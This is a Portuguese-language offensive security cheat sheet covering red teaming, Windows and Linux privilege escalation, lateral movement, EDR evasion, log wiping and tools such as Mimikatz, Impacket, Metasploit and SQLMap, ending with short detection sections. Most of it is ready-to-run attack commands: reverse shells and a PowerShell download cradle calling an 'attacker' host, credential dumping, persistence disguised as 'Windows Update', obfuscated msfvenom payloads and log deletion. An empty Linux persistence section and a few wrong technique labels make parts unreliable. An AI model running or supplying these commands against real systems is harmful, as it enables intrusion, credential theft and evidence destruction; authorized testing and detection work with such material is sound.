🔴 Red Team

Simular adversários reais em operações estruturadas de teste de segurança, cobrindo todo o Cyber Kill Chain.

O que é

Red Team é uma simulação realista de um ataque APT, onde o objetivo é testar não apenas a defesa técnica, mas também processos, pessoas e procedimentos.

Para que serve

  • Testar resposta a incidentes
  • Validar controles de segurança
  • Treinar time de defesa
  • Identificar gaps em detecção

Fases do Red Team

1. Reconhecimento (OSINT passivo) 2. Weaponização (criar payloads) 3. Entrega (phishing, watering hole) 4. Exploração (explorar vulnerabilidade) 5. Instalação (persistência) 6. C2 (Command & Control) 7. Ações nos Objetivos (lateral movement, data exfil)

Ferramentas principais

nmap -sS -p- target.com subfinder -d target.com BloodHound (AD mapping) Burp Suite (web testing) Metasploit (exploitation) HAVOC C2 (command & control)
💡 Dica: Red Teams focam em OPSEC, evasão e persistência — não é apenas exploração rápida, é operação realista.

🔍 Pentest (Penetration Testing)

Teste de penetração estruturado para identificar vulnerabilidades em sistemas, aplicações e infraestrutura.

O que é

Pentest é um teste de segurança autorizado onde você tenta explorar vulnerabilidades para medir a postura de segurança.

Diferença: Pentest vs Red Team

  • Pentest: Encontrar vulnerabilidades (goal: relatório)
  • Red Team: Simular adversário real (goal: testar defesa)

Fases do Pentest

1. Reconhecimento (passive + active) 2. Scanning (vulnerabilidades) 3. Enumeração (informações detalhadas) 4. Exploração (confirmação de vulns) 5. Pós-exploração (impacto) 6. Relatório (findings + recomendações)

Comando rápido para iniciar

📋 nmap -A -p- target.com -o nmap_results.txt burpsuite & sqlmap -u "http://target.com?id=1" --dbs

Ferramentas por fase

  • Scanning: Nmap, Nessus, OpenVAS
  • Web: Burp Suite, OWASP ZAP
  • Exploitation: Metasploit, Impacket
  • Reporting: Burp, Nessus, Dradis

🪟 Privilege Escalation — Windows

Técnicas para elevar privilégios de usuário comum para administrador/SYSTEM.

O que é

Privilege Escalation é o processo de ganhar permissões maiores após acesso inicial (ex: user → admin).

Verificar privilégios atuais

📋 whoami /all whoami /priv Get-Identity

Técnicas comuns (Windows)

1. UAC Bypass

📋 # Via COM object (fodhelper) C:\Windows\System32\fodhelper.exe # Via registry reg add HKCU\Software\Classes\ms-settings\shell\open\command /v "" /d "C:\beacon.exe" /f start ms-settings:

2. Service Vulnerability

📋 accesschk64.exe -accepteula -nobanner /w "Authenticated Users" c:\ # Se "Authenticated Users" pode escrever no diretório do serviço # Substituir DLL/EXE e reiniciar o serviço sc query state=all | findstr /i "SERVICE_NAME"

3. DLL Hijacking

📋 # Procurar por DLLs faltando Procmon.exe → filtrar "NAME NOT FOUND" # Injetar DLL malicioso no caminho procurado

4. Kernel Exploit

📋 systeminfo > info.txt # Usar WES.py para encontrar CVEs python wes.py info.txt # Baixar exploit e executar

5. Credentials em memória

📋 mimikatz.exe privilege::debug sekurlsa::logonpasswords # Copiar hash NTLM e fazer Pass-the-Hash
⚠️ Detecção: Monitore changes em services, registry UAC, DLL injection (Module Load), Kernel exploits.

🐧 Privilege Escalation — Linux

Técnicas para elevar privilégios de usuário comum para root em Linux.

Verificar privilégios atuais

📋 id sudo -l groups

Técnicas comuns (Linux)

1. Sudo Misconfiguration

📋 sudo -l # Se pode rodar comando sem senha: sudo -u root /usr/bin/python -c "import os; os.system('/bin/bash')" # NOPASSWD abuse # Se sudoers permite: user ALL=(root) NOPASSWD: /usr/bin/python sudo /usr/bin/python -c "import os; os.execvp('bash', ['bash'])"

2. SUID Binary Abuse

📋 # Encontrar SUID binaries find / -perm -4000 2>/dev/null # Exemplo: /usr/bin/passwd é SUID # Alguns binários podem ser abusados # Consultar GTFOBins: https://gtfobins.github.io/ /usr/bin/find . -exec /bin/bash \; -quit

3. Kernel Exploit

📋 uname -a # Procurar CVEs para versão do kernel # Compilar e executar exploit gcc exploit.c -o exploit ./exploit

4. Credential Hunting

📋 cat ~/.bash_history cat ~/.ssh/authorized_keys grep -r "password" /var/www 2>/dev/null find / -name "*.sql" 2>/dev/null

5. Cron Jobs

📋 crontab -l cat /etc/crontab ls -la /etc/cron.d/ # Se script malformado ou writable: echo "bash -i >& /dev/tcp/attacker/4444 0>&1" >> script.sh

Ferramentas úteis

📋 # Enum automática LinEnum.sh linpeas.sh
⚠️ Detecção: Monitore sudo execução, SUID binary access, cron job modifications, kernel version exploits.

↔️ Lateral Movement

Técnicas para se mover entre hosts/usuários/domínios após acesso inicial.

Técnicas principais

Pass-the-Hash (Windows)

📋 # Dump hash via mimikatz mimikatz > sekurlsa::logonpasswords # Copiar NTLM hash # Usar hash para autenticar pth-winexe -U user%NTLM_HASH //target cmd.exe crackmapexec smb 192.168.1.100 -u admin -H aad3b435b51404ee:e52caf7f1c5439a87dcf22f57409e63e -x "whoami"

Pass-the-Ticket (Kerberos)

📋 # Dump ticket mimikatz > kerberos::list # Reutilizar ticket mimikatz > kerberos::ptt ticket.kirbi # Ou via secretsdump secretsdump.py domain/user:pass@target psexec.py -k -no-pass domain/user@target

Kerberoasting

📋 GetUserSPNs.py -request domain/user:pass # Crack hashes offline hashcat -m 13100 spn_hashes.txt wordlist.txt

Psexec

📋 psexec.py domain/user:pass@target cmd psexec.py domain/user:pass@target -c beacon.exe

Ferramentas

  • Impacket (secretsdump, psexec, GetUserSPNs)
  • Mimikatz (credential dumping)
  • BloodHound (AD path mapping)
  • CrackMapExec (multi-host testing)

🔐 OPSEC (Operational Security)

Práticas para manter sigilo e segurança durante operações ofensivas.

Princípios

  • Minimizar evidência deixada
  • Evitar detecção de IDS/IPS/EDR
  • Proteger identidade real
  • Compartimentalizar operações

Checklist OPSEC

📋 ☐ Usar VPN/Proxy para conexões ☐ Usar domínio legítimo para C2 ☐ Certificado SSL válido (não self-signed) ☐ Jitter nas comunicações (não regular) ☐ User-Agent realista ☐ Evitar executar comportamentos suspeitos juntos ☐ Limpar logs após operação ☐ Não reutilizar infraestrutura ☐ Comunicação encriptada ☐ Monitorar threads de segurança

Limpeza de Logs

📋 # Windows wevtutil cl System wevtutil cl Security wevtutil cl Application # Linux history -c rm /var/log/* -rf shred -vfz -n 5 /var/log/auth.log
⚠️ Aviso: Limpeza agressiva de logs É detectável. Considerar deixar alguns logs mistos.

👻 EDR Evasion

Técnicas para contornar Endpoint Detection and Response (EDR).

Tipos de detecção EDR

  • Assinatura: Pattern matching conhecido
  • Heurística: Análise comportamental estática
  • Comportamental: Monitoramento em tempo real

Técnicas de Evasão

1. Syscall Direto (Bypass API hooks)

📋 # Chamar syscall direto em assembly # Evita hooks de EDR em Win32 API mov rax, syscall_number syscall

2. Process Injection

📋 # Injetar code em processo legítimo (explorer.exe) VirtualAllocEx + WriteProcessMemory + CreateRemoteThread # Payload roda como filho de explorer.exe (legítimo)

3. Fileless Execution

📋 # PowerShell reflection (carregar EXE em memória) $bytes = [System.IO.File]::ReadAllBytes('beacon.exe') [System.Reflection.Assembly]::Load($bytes).GetType('Namespace.Class').GetMethod('Main').Invoke($null, $null)

4. Living off the Land

📋 # Usar binários legítimos do Windows msiexec /V /Z "beacon.msi" regsvcs.exe beacon.dll InstallUtil.exe beacon.exe powershell.exe -ep bypass

Detecção vs Evasão

EDR monitora: Syscalls, Process creation, Memory injection, Registry changes, Network connections

Evitar: Comportamentos conhecidos de malware (ex: open LSASS, inject rundll32)

⚔️ Post-Exploitation

Atividades realizadas após exploração inicial com sucesso.

Fases pós-exploração

  1. Estabilização (manter acesso)
  2. Enumeração (mapear rede)
  3. Lateral Movement (se mover)
  4. Privilege Escalation (aumentar privs)
  5. Persistência (manter acesso)
  6. Exfiltração (roubar dados)

Dump de Credenciais

📋 # Mimikatz (LSASS dump) mimikatz.exe sekurlsa::logonpasswords sekurlsa::minidump lsass.dmp # SAM dump reg save HKLM\SAM sam reg save HKLM\SYSTEM system creddump7 system sam # NTDS.dit (DC) ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q

Enumeração de AD

📋 Get-ADUser -Filter * -Properties * | select Name,adminCount,LastLogonDate Get-ADGroup -Filter {adminCount -eq 1} Get-ADComputer -Filter * | select Name # BloodHound SharpHound.exe -c All # Upload em BloodHound UI

Persistência

📋 # Registry RUN key reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Svchost /t REG_SZ /d "C:\beacon.exe" # Scheduled Task schtasks /create /tn "Windows Update" /tr "C:\beacon.exe" /sc minute /mo 5 # Service sc create Svchost binPath= "C:\beacon.exe" sc start Svchost

🔵 Burp Suite

Proxy web e scanner de vulnerabilidades líder em testes de aplicações web.

Funcionalidades principais

  • Proxy: Interceptar/modificar requests HTTP
  • Scanner: Scan automático de vulnerabilidades
  • Intruder: Fuzzing e brute-force
  • Repeater: Testar requests customizadas
  • Decoder: Encoding/decoding

Workflow básico

📋 1. Abrir Burp Suite 2. Configurar proxy (127.0.0.1:8080) 3. Target → Scope → Add target URL 4. Navegar no browser (tráfego capturado) 5. Proxy → Intercept → Review requests 6. Scanner → Active/Passive Scan 7. Issues → Revisar vulnerabilidades

Scan ativo vs Passivo

  • Passivo: Analisa requests/responses capturadas (sem gerar novo tráfego)
  • Ativo: Envia requests customizadas para testar vulns (barulhento)

Intruder (Fuzzing)

📋 1. Intruder → Positions → Selecionar payload markers (§) 2. Payloads → Load wordlist 3. Resource Pool → Aumentar threads 4. Start attack 5. Analisar resultados (status code, resposta)
💡 Dica: Use "Scope" para focar apenas em URLs alvo, reduz falsos positivos no scanner.

🩸 BloodHound

Visualiza relacionamentos e caminhos de ataque em Active Directory.

O que faz

BloodHound mapeia usuários, grupos, computadores e relações de permissão em AD, mostrando caminhos de ataque até Domain Admin.

Instalação & Coleta

📋 # Download SharpHound collector .\SharpHound.exe -c All # Ou via Python (Linux) python3 bloodhound.py -d domain.com -u user -p pass -c All

Análise de dados

📋 1. Abrir BloodHound (Neo4j backend) 2. Upload .zip coletado 3. Home → Queries pré-prontas - Find Shortest Path to DA - Find users with AD recycle bin rights - Find High Value Targets 4. Analisar visual

Queries customizadas

📋 # Encontrar usuários com privilégio adminCount MATCH (u:User) WHERE u.adminCount = true RETURN u # Encontrar path mais curto a Domain Admin MATCH p=shortestPath((u:User)-[*..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"})) RETURN p

Técnicas encontradas no BH

  • Constrained Delegation
  • Unconstrained Delegation
  • Resource-based Constrained Delegation
  • GenericWrite/GenericAll permissions
  • Kerberoasting opportunities
💡 Dica: Depois de explorar um caminho, marque como "Compromised" no BH para acompanhar progresso.

🌐 NXC (NetExec)

Ferramenta moderna para testes de segurança em redes SMB/LDAP/Kerberos (successor do CrackMapExec).

Funcionalidades

  • Descoberta de hosts e enumeração
  • Validação de credenciais (spray)
  • Execução remota de comandos
  • Pass-the-Hash / Pass-the-Ticket
  • Dumping de hashes
  • Módulos customizáveis

Instalação

📋 pip install nxc # ou apt install nxc

Uso básico

📋 # Descobrir hosts vivos nxc smb 192.168.1.0/24 # Validar credenciais nxc smb 192.168.1.100 -u user -p pass # Spray (testar múltiplos usuários/senhas) nxc smb 192.168.1.0/24 -u users.txt -p pass.txt --continue-on-success # Execução remota nxc smb 192.168.1.100 -u admin -p pass -x "whoami" # Dump de SAM nxc smb 192.168.1.100 -u admin -p pass --sam

Pass-the-Hash

📋 # Usar NTLM hash (sem senha) nxc smb 192.168.1.100 -u admin -H "aad3b435b51404ee:e52caf7f1c5439a87dcf22f57409e63e" -x "whoami" # Verificar risco nxc smb 192.168.1.100 -u admin -H --sam

Módulos

📋 # Listar módulos nxc smb -L # Usar módulo (ex: Mimikatz) nxc smb 192.168.1.100 -u admin -p pass -M mimikatz
💡 Diferença: NXC é mais rápido e moderno que CrackMapExec, com melhor handling de erros.

🎯 Nmap

Scanner de portas e detecção de serviços - ferramenta essencial de reconhecimento.

Tipos de scans

  • -sS (SYN): Stealth scan (rápido, recomendado)
  • -sT (TCP): Full connection (lento, detectável)
  • -sU (UDP): UDP scan
  • -sA (ACK): Firewall mapping
  • -Pn: Não fazer ping (assume host ativo)

Scans comuns

📋 # Quick scan (top 1000 portas) nmap -F target.com # Scan rápido completo nmap -sS -Pn -p- target.com --min-rate 5000 # Scan detalhado (versão + scripts) nmap -sV -sC -p- target.com # Agressivo (OS detection + scripts) nmap -A -p- target.com # Output em múltiplos formatos nmap -A -p- target.com -oA results

Evasão de IDS/IPS

📋 # Fragmentação de pacotes nmap -f target.com # Decoys (misturar com IPs falsos) nmap -D RND:10 target.com # Espaçamento entre pacotes nmap --scan-delay 100ms target.com # Data padding nmap --data-length 100 target.com

Script NSE

📋 # Rodar scripts de vulnerabilidades nmap --script=vuln target.com # Script específico nmap --script=smb-os-discovery target.com # Categor​ias: auth, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, vuln
⚠️ Aviso: Alguns scripts são "intrusive" e podem disrupted serviços. Use com cuidado.

⚙️ Metasploit

Framework completo para exploitation e post-exploitation.

Componentes

  • Exploits: Código que explora vulnerabilidades
  • Payloads: Código a executar após exploração
  • Encoders: Ofuscar payload
  • Listeners: Receber conexão reversa

Workflow básico

📋 # Iniciar console msfconsole # Buscar exploit search exploit smb search type:exploit platform:windows privilege_escalation:true # Usar exploit use exploit/windows/smb/ms17_010_eternalblue show options set RHOSTS 192.168.1.100 set LHOST 192.168.1.1 set PAYLOAD windows/meterpreter/reverse_tcp exploit

Msfvenom (Gerador de payloads)

📋 # Gerar payload reversível msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o payload.exe # Com obfuscação msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -e shikata_ga_nai -i 5 -f exe -o payload.exe # Payload PowerShell msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f powershell

Meterpreter (Payload interativo)

📋 # Após exploração com sucesso: meterpreter> help # Comandos úteis meterpreter> sysinfo meterpreter> getuid meterpreter> whoami meterpreter> hashdump # Dump SAM meterpreter> run persistence # Persistent backdoor meterpreter> run post/windows/gather/credentials

💾 SQLMap

Ferramenta para automatizar detecção e exploração de SQL Injection.

Tipos de SQL Injection detectados

  • Boolean-based blind
  • Time-based blind
  • Error-based
  • UNION-based
  • Stacked queries

Uso básico

📋 # Auto-detect SQL injection sqlmap -u "http://target.com/page.php?id=1" # Especificar ponto de injeção (*) sqlmap -u "http://target.com/page.php?id=1*" # Enumerate databases sqlmap -u "http://target.com/page.php?id=1" --dbs # Dump table sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump # Tentativas por diferentes técnicas sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ

POST request

📋 # Salvar POST request em arquivo # Burp → Copy to file → request.txt sqlmap -r request.txt --dbs # Ou inline sqlmap -u "http://target.com/login" --data="user=admin&pass=1*" --dbs

Crawl & Test

📋 # Crawl site e testar todos URLs sqlmap -u "http://target.com" --crawl=2 --batch # Testar todas as formas sqlmap -u "http://target.com" --forms --batch

OS Shell

📋 # Ganhar shell do SO (se DB pode executar system commands) sqlmap -u "http://target.com/page.php?id=1" --os-shell

📦 Impacket

Biblioteca Python com ferramentas de segurança para protocolos de rede (SMB, LDAP, Kerberos).

Ferramentas principais

📋 GetUserSPNs.py # Kerberoasting GetNPUsers.py # ASREPRoasting secretsdump.py # Dump credenciais psexec.py # Execução remota ticketer.py # Forjar tickets Kerberos lookupsid.py # Dump SIDs

Kerberoasting

📋 # Pedir TGS (ticket) para contas de serviço python3 GetUserSPNs.py -request domain/user:pass # Crack hashes hashcat -m 13100 spn_hashes.txt wordlist.txt

ASREPRoasting

📋 # Encontrar contas sem pré-auth Kerberos python3 GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt # Crack hashcat -m 18200 hashes.txt wordlist.txt

Dump de Credenciais via SMB

📋 # SAM + SYSTEM python3 secretsdump.py domain/user:pass@target # NTDS.dit (Domain Controller) python3 secretsdump.py -ntds-file ntds.dit -system-file system.hive local # Via VSS (Volume Shadow Copy) python3 secretsdump.py -vss domain/user:pass@dc

Psexec (Execução Remota)

📋 # Com senha python3 psexec.py domain/user:pass@target cmd # Com hash (Pass-the-Hash) python3 psexec.py domain/user@target -hashes aad3b435b51404ee:e52caf7f1c5439a87dcf22f57409e63e # Kerberos python3 psexec.py -k -no-pass domain/user@target

Ticketer (Forjar Golden Ticket)

📋 # Forjar ticket usando KRBTGT hash python3 ticketer.py -nthash -domain-sid -domain Administrator # Usar ticket export KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass domain/administrator@target

💀 Mimikatz

Ferramenta de extração de credenciais em memória — essencial em pós-exploração Windows.

Funcionalidades principais

  • Dump LSASS (credenciais em memória)
  • Pass-the-Hash/Pass-the-Ticket
  • Golden Ticket creation
  • DCSync (replicação DC)
  • Token impersonation

Setup

📋 # Executar como admin mimikatz.exe # Permitir debug privilege::debug # Dump LSASS sekurlsa::logonpasswords

Dump de Credenciais

📋 mimikatz > privilege::debug mimikatz > sekurlsa::logonpasswords # Saída contém: # NTLM hash # Plaintext password (se ainda em memória) # Kerberos tickets

SAM Dump (local)

📋 mimikatz > lsadump::sam # Extrai hashes de usuários locais

DCSync (Dump NTDS)

📋 # Replicar NTDS.dit do DC (requer permissão de replicação) mimikatz > lsadump::dcsync /domain:domain.com /user:krbtgt # Ou via secretsdump.py python3 secretsdump.py domain/admin:pass@dc -just-dc

Golden Ticket

📋 mimikatz > kerberos::golden /user:Administrator /sid:S-1-5-21-... /krbtgt: /ticket:ticket.kirbi # Usar ticket mimikatz > kerberos::ppt ticket.kirbi # Agora acesso ao domínio como Administrator

Pass-the-Hash

📋 # Injetar hash em sessão mimikatz > sekurlsa::pth /user:admin /domain:domain.com /ntlm: # Abre cmd.exe com credenciais do admin
⚠️ Detecção: Mimikatz dispara alertas de EDR ao: - Usar privilege::debug - Chamar sekurlsa:: (LSASS access) - Fazer kerberos::golden

📘 Active Directory

Infraestrutura de autenticação e autorização em redes Windows corporativas.

Componentes principais

  • Domain Controller (DC): Gerencia usuários, grupos, políticas
  • Users: Contas de domínio
  • Groups: Agrupamentos de usuários/computadores
  • Computers: Máquinas no domínio
  • GPOs: Políticas aplicadas via Group Policy

Enumeration básica

📋 # Listar usuários net user /domain Get-ADUser -Filter * | select Name,Enabled,PasswordLastSet # Listar grupos net group /domain Get-ADGroup -Filter * | select Name # Admin users net group "Domain Admins" /domain Get-ADUser -Filter {adminCount -eq 1} # Computadores Get-ADComputer -Filter * | select Name # Domain Controllers nltest /dclist:domain.com

Ataques comuns em AD

  • Kerberoasting: Crack tickets de contas de serviço
  • ASREPRoasting: Contas sem pré-auth
  • Pass-the-Hash: Usar hashes ao invés de senhas
  • Golden Ticket: Forjar tickets administrativos
  • Constrained Delegation: Escalar privilégios via delegação
  • GPO Abuse: Explorar políticas de grupo

BloodHound para mapeamento

Use BloodHound para visualizar relacionamentos e encontrar paths de ataque até Domain Admin.

💡 Dica: AD é frequentemente o alvo principal em red teams corporativos — comprometer AD = comprometer a rede inteira.

🪟 Windows — Ofensivo & Defensivo

Técnicas maliciosas em Windows e como detectá-las.

Técnicas ofensivas comuns

Execução de código

📋 # PowerShell powershell.exe -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')" # CMD cmd.exe /c "for /l %i in (1,1,3) do @ping 127.0.0.1" # WMI wmic process call create "cmd.exe /c beacon.exe" # COM python3 -c "import win32com.client; o = win32com.client.GetObject('winmgmts:'); o.ExecMethod('Win32_Process', 'Create', 'notepad.exe')"

Persistence

📋 # Registry RUN key reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Svchost /t REG_SZ /d "C:\beacon.exe" # Scheduled Task schtasks /create /tn "Windows Update" /tr "C:\beacon.exe" /sc minute /mo 5 # Service sc create Svchost binPath= "C:\beacon.exe" # WMI Event Subscription wmic /node:localhost /namespace:\\root\subscription path __EventFilter create Name="MyFilter", EventNamespace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Perfos'"

Detecção de atividades maliciosas

Monitorar Processos

  • PowerShell.exe -ep bypass: Bypass de execution policy
  • cmd.exe /c: Execução silenciosa de comando
  • wmic.exe: WMI execution (suspeito se sem contexto)
  • msiexec.exe: MSI installation (LOLBin abuse)
  • regsvcs.exe / InstallUtil.exe: .NET abuses

Monitorar Registry

📋 # Alertar em changes em: HKLM\Software\Microsoft\Windows\CurrentVersion\Run HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run # Via PowerShell logging Get-EventLog -LogName "Windows PowerShell" -Newest 100

Monitorar Network

  • Conexões para IPs/domínios suspeitos
  • DNS queries com caracteres suspeitos
  • Tráfego HTTPS para CAs não confiáveis
⚠️ EDR Monitoring: Procurar: Unauthorized process creation, registry modification, DLL injection, LSASS access, non-admin user privilege escalation.

🐧 Linux — Ofensivo & Defensivo

Técnicas maliciosas em Linux e como detectá-las.

Técnicas ofensivas comuns

Execução remota

📋 # SSH execution ssh user@target "whoami" # RDP-like (via SSH) ssh -D 9050 user@target # Reverse shell bash -i >& /dev/tcp/attacker/4444 0>&1 nc -e /bin/bash attacker 4444

Persistence

🎯 MITRE ATT&CK

Framework que documenta técnicas de adversários conhecidas e comprovadas.

O que é

MITRE ATT&CK é uma base de conhecimento curada com técnicas, tácticas e procedimentos (TTPs) usados por adversários reais contra organizações.

Estrutura

  • Tactics: Objetivo do adversário (ex: Initial Access, Privilege Escalation)
  • Techniques: Como executar a tática (ex: T1566 Phishing)
  • Sub-techniques: Variação específica (ex: T1566.001 Spearphishing Attachment)
  • Procedures: Implementação específica por malware

Tácticas principais

📋 TA0001 - Initial Access (entrada) TA0002 - Execution (executar código) TA0003 - Persistence (manter acesso) TA0004 - Privilege Escalation (aumentar privilégios) TA0005 - Defense Evasion (evitar defesa) TA0006 - Credential Access (roubar credenciais) TA0007 - Discovery (reconhecimento interno) TA0008 - Lateral Movement (mover entre sistemas) TA0009 - Collection (coletar dados) TA0010 - Exfiltration (roubar dados) TA0011 - Command and Control (comunicação) TA0040 - Impact (impacto)

Exemplo: Técnica T1110 (Brute Force)

📋 ID: T1110 Name: Brute Force Tactic: TA0006 (Credential Access) Sub-techniques: - T1110.001: Password Guessing - T1110.002: Password Spraying - T1110.003: Password Cracking - T1110.004: Credential Stuffing Detections: - Multiple failed login attempts - Unusual login patterns

Como usar no Red Team

  1. Planejar operação usando MITRE ATT&CK
  2. Mapear cada técnica usada (T1XXX)
  3. Documentar no relatório
  4. Ajudar defesa a entender ataque via MITRE IDs

Recursos

https://attack.mitre.org

📋 TTPs (Tactics, Techniques, Procedures)

Padrão de comportamento de um adversário.

Definições

  • Tactics: Objetivos de alto nível (MITRE ATT&CK Tactics)
  • Techniques: Como alcançar cada objetivo (MITRE ATT&CK Techniques)
  • Procedures: Implementação específica (ex: qual ferramenta, qual comando)

Exemplo: APT1 (Comment Crew)

📋 Tactic: Initial Access (TA0001) Technique: Spearphishing (T1566) Procedure: Enviar email malicioso com anexo Office Tactic: Execution (TA0002) Technique: User Execution (T1204) Procedure: Vítima abre anexo, macro executa Tactic: Privilege Escalation (TA0004) Technique: Kernel Exploit (T1548.001) Procedure: Usar CVE-2009-2846 (Windows) Tactic: Lateral Movement (TA0008) Technique: Pass-the-Hash (T1550.002) Procedure: Usar credentials roubadas com psexec

Documentar TTPs no Red Team

Sempre mapear operações a MITRE ATT&CK para facilitar análise defensiva.

💡 Prioridade defensiva: TTPs comuns (Phishing, Pass-the-Hash) devem ter detecção específica.

🔴 Threat Detection

Capacidade de identificar atividades maliciosas em tempo real ou análise retrospectiva.

Tipos de detecção

  • Signature-based: Pattern matching conhecido
  • Anomaly-based: Desvio do comportamento normal
  • Behavioral: Análise de cadeia de atividades

Indicadores de ataque (IoCs)

📋 IP malicioso Domain C2 Hash de malware Assinatura de arquivo String de URL

Sigma rules (genéricas)

📋 title: PowerShell execution from temp logsource: product: windows category: process_creation detection: selection: Image|endswith: '\powershell.exe' CommandLine|contains: - 'AppData\Local\Temp' - 'Downloads' condition: selection

YARA rules (malware)

📋 rule MalwareExample { strings: $s1 = "cmd.exe /c" wide $s2 = "powershell.exe -ep bypass" wide $hex = { 4D 5A 90 00 } // MZ header condition: all of them }

Detection tuning (reduzir falsos positivos)

  1. Baseline comportamento normal
  2. Whitelist sistemas legítimos
  3. Correlação com múltiplos eventos
  4. Severidade baseada em contexto

⚙️ Detection Rule Tuning

Otimizar regras de detecção para maximizar efetividade e minimizar falsos positivos.

Problema: Falsos positivos

  • Reduzem confiança em alertas
  • Aumentam carga de SOC
  • Mascaram ataques reais

Estratégia de tuning

1. Whitelisting

📋 # Adicionar processos legítimos # Ex: Backup software que executa PowerShell # Excluir de alert: (ImageName != "*backup*.exe")

2. Correlação

📋 # Ao invés de alertar em qualquer: # PowerShell.exe com IEX # Alertar apenas em: # PowerShell.exe + IEX + DestinationPort=443 + NewProcess=rundll32.exe

3. Contextualização

  • Horário (behavior anormal fora de horas de trabalho?)
  • Usuário (admin ou usuário comum?)
  • Localização (IP corporativo ou VPN?)
  • Histórico (foi detectado antes?)

4. Métrica: True Positive vs False Positive

📋 Precision = TP / (TP + FP) Recall = TP / (TP + FN) F-score = 2 * (Precision * Recall) / (Precision + Recall) Meta: Maximize Precision (reduzir FP) sem sacrificar Recall (não perder ataques)

Processo contínuo

  1. Coletar feedback de SOC (muitos falsos positivos?)
  2. Ajustar thresholds / correlation
  3. A/B test novas regras
  4. Medir impacto em TP/FP
  5. Iterar
💡 Regra 80/20: 20% das regras capturam 80% dos verdadeiros ataques — foco nessas.
